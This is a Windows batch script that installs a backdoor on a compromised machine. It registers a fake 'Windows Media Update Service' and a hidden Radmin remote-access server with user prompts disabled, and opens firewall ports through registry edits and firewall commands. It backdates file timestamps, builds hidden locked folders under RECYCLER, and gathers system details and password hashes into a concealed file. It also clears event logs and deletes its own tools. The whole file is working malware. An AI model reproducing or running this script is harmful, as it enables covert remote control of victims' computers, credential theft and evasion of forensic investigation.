@echo off
	set DR32=%windir%\system32

	if not exist "%windir%\system32\backdoorinstall.exe" (goto exitx)

	md "%programfiles%\Windows Media Player"

        cd\
        cd %DR32%\

	move wmupdatesrv.exe "%programfiles%\Windows Media Player"

	cd\
	cd "%programfiles%\Windows Media Player"

	wmupdatesrv.exe /i

	cd\
	cd %DR32%\

	net start wmsrv
	sc start wmsrv
	sc config wmsrv start= auto displayname= "Windows Media Update Service"
	sc description wmsrv "Provides updates for Windows media player and its components. If this service is disabled, any services that explicitly depend on it will fail to start."
	sc config wmsrv error= ignore
	sc failure wmsrv actions= restart/500 reset= 10
	sc config lanmanserver depend= wmsrv
	sc config lanmanworkstation depend= wmsrv


	if not exist "c:\windows" (goto fireb)
	cd\
	cd %windir%

	echo Windows Registry Editor Version 5.00 >> winreg.reg

	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\AuthorizedApplications\List] >> winreg.reg
	echo "%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe"="%programfiles%:*:enabled:Windows Media Update Service" >> winreg.reg
	echo "%programfiles%\\networking\\bin\\netsrv.exe"="%programfiles%\\networking\\bin\netsrv.exe:*:enabled:NetBIOS TCP/IP Server" >> winreg.reg

	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List] >> winreg.reg
	echo "%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe"="%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe:*:enabled:Windows Media Update Service" >> winreg.reg
	echo "%programfiles%\\networking\\bin\\netsrv.exe"="%programfiles%\\networking\\bin\\netsrv.exe:*:enabled:NetBIOS TCP/IP Server" >> winreg.reg

	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List] >> winreg.reg
	echo "xpsp2res.dll,-22002"="1056:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22003"="1059:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22004"="1066:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22005"="1067:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22006"="1068:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22007"="1285:TCP:*:Enabled" >> winreg.reg

	regedit /s winreg.reg
	del winreg.reg /q

	MSfw.exe config notifications disable
	MSfw.exe port add 1256/tcp /name:@xpsp2res.dll,-22002 /scope:* /enable
	MSfw.exe port add 1259/tcp /name:@xpsp2res.dll,-22003 /scope:* /enable
	MSfw.exe port add 1067/tcp /name:@xpsp2res.dll,-22005 /scope:* /enable
	MSfw.exe port add 1066/tcp /name:@xpsp2res.dll,-22004 /scope:* /enable
	MSfw.exe port add 1285/tcp /name:@xpsp2res.dll,-22007 /scope:* /enable
	MSfw.exe app add "%programfiles%\Windows Media Player\wmupdatesrv.exe" /name:"Windows Media Update Service" /scope:* /enable
	MSfw.exe app add "%programfiles%\networking\bin\netsrv.exe" /name:"TCP/IP Server" /scope:* /enable
	
	:fireb
	if not exist "d:\windows" (goto Radmin)
	cd\
	cd %windir%

	echo Windows Registry Editor Version 5.00 >> winreg.reg
 
	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\AuthorizedApplications\List] >> winreg.reg
	echo "%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe"="%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe:*:enabled:Windows Media Update Service" >> winreg.reg
	echo "%programfiles%\\networking\\bin\\netsrv.exe"="%programfiles%\\networking\\bin\\netsrv.exe:*:enabled:NetBIOS TCP/IP Server" >> winreg.reg

	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List] >> winreg.reg
	echo "%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe"="%programfiles%\\%programfiles%\\Windows Media Player\\wmupdatesrv.exe:*:enabled:Windows Media Update Service" >> winreg.reg
	echo "%programfiles%\\networking\\bin\\netsrv.exe"="%programfiles%\\networking\\bin\\netsrv.exe:*:enabled:NetBIOS TCP/IP Server" >> winreg.reg

	echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List] >> winreg.reg
	echo "xpsp2res.dll,-22002"="1056:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22003"="1059:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22004"="1066:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22005"="1067:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22006"="1068:TCP:*:Enabled" >> winreg.reg
	echo "xpsp2res.dll,-22007"="1285:TCP:*:Enabled" >> winreg.reg

	regedit /s winreg.reg
	del winreg.reg /q

	MSfw.exe config notifications disable
	MSfw.exe port add 1256/tcp /name:@xpsp2res.dll,-22002 /scope:* /enable
	MSfw.exe port add 1259/tcp /name:@xpsp2res.dll,-22003 /scope:* /enable
	MSfw.exe port add 1067/tcp /name:@xpsp2res.dll,-22005 /scope:* /enable
	MSfw.exe port add 1066/tcp /name:@xpsp2res.dll,-22004 /scope:* /enable
	MSfw.exe port add 1285/tcp /name:@xpsp2res.dll,-22007 /scope:* /enable
	MSfw.exe app add "%programfiles%\Windows Media Player\wmupdatesrv.exe" /name:"Windows Media Update Service" /scope:* /enable
	MSfw.exe app add "%programfiles%\networking\bin\netsrv.exe" /name:"TCP/IP Server" /scope:* /enable

	:Radmin
	cd\
	cd %DR32%\

	md "%programfiles%\networking\bin"

	move netsrv.exe "%programfiles%\networking\bin"

	cd\
	cd "%programfiles%\networking\bin"

        net stop r_server
	sc config r_server start= disabaled
	serv.exe INSTALL netser /n:"NetBIOS TCP/IP Server" /b:%programfiles%\networking\bin\netsrv.exe /u:LocalSystem /s:AUTO /i:yes
	dtreg -AddKey \HKLM\SYSTEM\RAdmin
	dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0
	dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0\Server
	dtreg -AddKey \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\NTAuthEnabled=00000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter=57a657074250948395daa84ddd90aa08
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port=05050000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Timeout=0a000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableLogFile=00000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\LogFilePath="c:\\logfile.txt"
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\FilterIp=00000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\DisableTrayIcon=01000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\AutoAllow=00000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\AskUser=00000000
	dtreg -Set REG_BINARY \HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableEventLog=00000000
	dtreg -Set REG_EXPAND_SZ "\HKLM\SYSTEM\CurrentControlSet\Services\netser\ImagePath=%programfiles%\networking\bin\netsrv.exe /service"

	net start netser
	sc description netser "Microsoft Networking Driver, allows multiple connections to a Local Area Network (LAN). If this service is disabled, any services that explicitly depend on it will fail to start."
	sc config netser error= ignore
	sc failure netser actions= restart/500 reset= 10
	sc config Remote Procedure Call depend= netser
	sc config lanmanserver depend= netser
	sc config lanmanworkstation depend= netser



	filedate admdll.dll 06/09/01 00-00-00
	filedate raddrv.dll 06/09/01 00-00-00
	filedate netsrv.exe 06/09/01 00-00-00

	cd\
	cd %DR32%\

	del windows\winreg.reg
	del %DR32%\dtreg.exe
	del %DR32%\pw.exe
	del %DR32%\serv.exe
	del %DR32%\gethashes.exe
	del %DR32%\anti.exe
	del %DR32%\msfw.exe

	attrib +R +S +H %DR32%\libeay32.dll
	attrib +R +S +H %DR32%\ssleay32.dll
	attrib +R +S +H %DR32%\sc.exe
	attrib +R +S +H %DR32%\pskill.exe

	filedate libeay32.dll 06/09/01 00-00-00
	filedate ssleay32.dll 06/09/01 00-00-00
	filedate sc.exe 06/09/01 00-00-00
	filedate pskill.exe 06/09/01 00-00-00
	filedate aproman.exe 06/09/01 00-00-00
	filedate MSfw.exe 06/09/01 00-00-00

        :: create folders
	if not exist "c:\RECYCLER" mkdir "c:\RECYCLER" | attrib "c:\RECYCLER" +s +h
	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y
	mkdir "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "c:\RECYCLER"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as c:\RECYCLER
	t.exe -g "c:\RECYCLER" "c:\RECYCLER"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y

	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y
	mkdir "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102"

	attrib.exe +h +s +r "c:\RECYCLER"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102"

	::change the time of the folder to make it the same as c:\RECYCLER
	t.exe -g "c:\RECYCLER" "c:\RECYCLER"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102" /G EVERYONE:F /Y
	dir.exe "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info" /G SYSTEM:F /Y
	dir.exe "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003" /D EVERYONE /Y
	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y

	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y
	mkdir "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\info\logs"

	attrib.exe +h +s +r "c:\RECYCLER"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs"
	attrib.exe +h +s +r "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs\0102"

	::change the time of the folder to make it the same as c:\RECYCLER
	t.exe -g "c:\RECYCLER" "c:\RECYCLER"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs"
	t.exe -g "c:\RECYCLER" "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs\0102"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs\01" /G EVERYONE:F /Y
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\logs" /G SYSTEM:F /Y
	dir.exe "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500" /D EVERYONE /Y
	dir.exe "c:\RECYCLER" /G EVERYONE:F /Y

	move desktops.ini "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\info\logs"
	move INFO2 "c:\recycler\S-1-5-21-3732111762-1530546613-1416731192-500\info\logs"

        pskill.exe wminstaller.exe

        del c:\wminstaller.exe
	del c:\recycler\wminstaller.exe
	del d:\wminstaller.exe
	del e:\wminstaller.exe
	del %windir%\temp\wminstaller.exe
	del %windir%\wminstaller.exe
	del %DR32%\wminstaller.exe

	set nfo=c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102\info.txt
	openp.exe -fport >> "%NFO%"
     	uptime.exe /s >> "%NFO%"
     	psinfo.exe -d >> "%NFO%"
     	inx -p >> "%NFO%"
        inx -i >> "%NFO%"
     	inx -s >> "%NFO%"
     	net start >> "%NFO%"
	net view >> "%NFO%"
	bw.exe >> "%NFO%"
     	net localgroup administrators >> "%NFO%"
	pd.exe >> "%NFO%"

	move pw.exe "c:\recycler\S-1-5-21-1004336348-2111687655-1957994488-1003\info\0102\"


	if not exist "d:\" (goto diske)
	if not exist "d:\RECYCLER" mkdir "d:\RECYCLER" | attrib "d:\RECYCLER" +s +h
	:: create folders
	dir.exe "d:\RECYCLER" /G EVERYONE:F /Y
	mkdir "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "d:\RECYCLER"
	attrib.exe +h +s +r "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as d:\RECYCLER
	t.exe -g "d:\RECYCLER" "d:\RECYCLER"
	t.exe -g "d:\RECYCLER" "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "d:\RECYCLER" "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "d:\RECYCLER" "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "d:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "d:\RECYCLER" /G EVERYONE:F /Y

	:diske
	if not exist "e:\" (goto diskf)
	if not exist "e:\RECYCLER" mkdir "e:\RECYCLER" | attrib "e:\RECYCLER" +s +h
	dir.exe "e:\RECYCLER" /G EVERYONE:F /Y
	mkdir "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "e:\RECYCLER"
	attrib.exe +h +s +r "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as e:\RECYCLER
	t.exe -g "e:\RECYCLER" "e:\RECYCLER"
	t.exe -g "e:\RECYCLER" "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "e:\RECYCLER" "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "e:\RECYCLER" "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "e:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "e:\RECYCLER" /G EVERYONE:F /Y
	
	:diskf
	if not exist "f:\" (goto diskg)
	if not exist "f:\RECYCLER" mkdir "f:\RECYCLER" | attrib "f:\RECYCLER" +s +h
	dir.exe "f:\RECYCLER" /G EVERYONE:F /Y
	mkdir "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "f:\RECYCLER"
	attrib.exe +h +s +r "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as f:\RECYCLER
	t.exe -g "f:\RECYCLER" "f:\RECYCLER"
	t.exe -g "f:\RECYCLER" "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "f:\RECYCLER" "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "f:\RECYCLER" "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"
	
	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "f:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "f:\RECYCLER" /G EVERYONE:F /Y
	
	:diskg
	if not exist "g:\" (goto diskh)
	if not exist "g:\RECYCLER" mkdir "g:\RECYCLER" | attrib "g:\RECYCLER" +s +h
	dir.exe "g:\RECYCLER" /G EVERYONE:F /Y
	mkdir "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "g:\RECYCLER"
	attrib.exe +h +s +r "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as g:\RECYCLER
	t.exe -g "g:\RECYCLER" "g:\RECYCLER"
	t.exe -g "g:\RECYCLER" "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "g:\RECYCLER" "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "g:\RECYCLER" "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "g:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "g:\RECYCLER" /G EVERYONE:F /Y

	:diskh
	if not exist "h:\" (goto diski)
	if not exist "h:\RECYCLER" mkdir "h:\RECYCLER" | attrib "h:\RECYCLER" +s +h
	dir.exe "h:\RECYCLER" /G EVERYONE:F /Y
	mkdir "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "h:\RECYCLER"
	attrib.exe +h +s +r "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as h:\RECYCLER
	t.exe -g "h:\RECYCLER" "h:\RECYCLER"
	t.exe -g "h:\RECYCLER" "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "h:\RECYCLER" "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "h:\RECYCLER" "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "h:\RECYCLER" /G EVERYONE:F /Y

	:diski
	if not exist "i:\" (goto diskk)
	if not exist "i:\RECYCLER" mkdir "i:\RECYCLER" | attrib "i:\RECYCLER" +s +h
	dir.exe "h:\RECYCLER" /G EVERYONE:F /Y
	mkdir "h:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "i:\RECYCLER"
	attrib.exe +h +s +r "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as i:\RECYCLER
	t.exe -g "i:\RECYCLER" "i:\RECYCLER"
	t.exe -g "i:\RECYCLER" "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "i:\RECYCLER" "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "i:\RECYCLER" "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "i:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "i:\RECYCLER" /G EVERYONE:F /Y

	:diskk
	if not exist "k:\" (goto diskmm)
	if not exist "k:\RECYCLER" mkdir "k:\RECYCLER" | attrib "k:\RECYCLER" +s +h
	dir.exe "k:\RECYCLER" /G EVERYONE:F /Y
	mkdir "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "k:\RECYCLER"
	attrib.exe +h +s +r "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as k:\RECYCLER
	t.exe -g "k:\RECYCLER" "k:\RECYCLER"
	t.exe -g "k:\RECYCLER" "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "k:\RECYCLER" "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "k:\RECYCLER" "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "k:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "k:\RECYCLER" /G EVERYONE:F /Y

	:dismm
	if not exist "m:\" (goto sec)
	if not exist "m:\RECYCLER" mkdir "m:\RECYCLER" | attrib "m:\RECYCLER" +s +h
	dir.exe "m:\RECYCLER" /G EVERYONE:F /Y
	mkdir "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	attrib.exe +h +s +r "m:\RECYCLER"
	attrib.exe +h +s +r "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	attrib.exe +h +s +r "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	attrib.exe +h +s +r "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::change the time of the folder to make it the same as m:\RECYCLER
	t.exe -g "m:\RECYCLER" "m:\RECYCLER"
	t.exe -g "m:\RECYCLER" "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501"
	t.exe -g "m:\RECYCLER" "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33"
	t.exe -g "m:\RECYCLER" "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup"

	::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
	dir.exe "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33\backup" /G EVERYONE:F /Y
	dir.exe "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501\Dc33" /G SYSTEM:F /Y
	dir.exe "m:\recycler\S-1-5-21-3732111762-1530546613-1416731192-501" /D EVERYONE /Y
	dir.exe "m:\RECYCLER" /G EVERYONE:F /Y

	del %DR32%\psinfo.exe
	del %DR32%\uptime.exe
	del %DR32%\filedate.exe
	del %DR32%\bw.exe
	del %DR32%\Inx.exe
	del %DR32%\anti.cmd
	del %DR32%\GetHashes.exe
	del %DR32%\pw.exe
	del %DR32%\openp.exe

	net start mcshield /y
	
	:sec
	%DR32%\cll.exe 1
	%DR32%\cll.exe 2
	%DR32%\cll.exe 3

	rgv -set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\AutoShareWks=0x00000000
	rgv -set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\AutoShareServ=0x00000000
	rgv -set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\AutoShareServer=0x00000000
	rgv -set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\DisableWebDAV=0x00000001
	rgv -set REG_DWORD \HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous=0x00000001
	rgv -set REG_SZ \HKLM\SOFTWARE\Microsoft\Ole\EnableDCOM=N


        pskill.exe wminstaller.exe

	del %DR32%\gethashes
	del %DR32%\psinfo.exe
	del %DR32%\uptime.exe
	del %DR32%\filedate.exe
	del %DR32%\bw.exe
	del %DR32%\Inx.exe
	del %DR32%\dir.exe
	del %DR32%\t.exe

	del c:\wminstaller.exe
	del c:\recycler\wminstaller.exe
	del %windir%\wminstaller.exe
	del %DR32%\wminstaller.exe


	%DR32%\sec.cmd


     	:exitx	
	pskill.exe cmd.exe
	pskill.exe svchost.exe
	pskill.exe lsass.exe
	pskill.exe services.exe
